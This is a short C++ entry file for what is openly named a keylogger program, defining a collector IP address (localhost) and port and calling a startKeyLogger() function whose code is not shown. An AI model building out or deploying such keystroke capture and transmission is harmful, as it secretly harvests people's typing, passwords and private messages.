#include "keylogger.hpp"
#include "keyboard_utils.hpp"
#include <iostream>
#include <string>

const std::string IP_ADDRESS = "127.0.0.1";
const std::string PORT = "1984";

int main() {
    if (!startKeyLogger()) {
        return 1;
    }

    return 0;
}
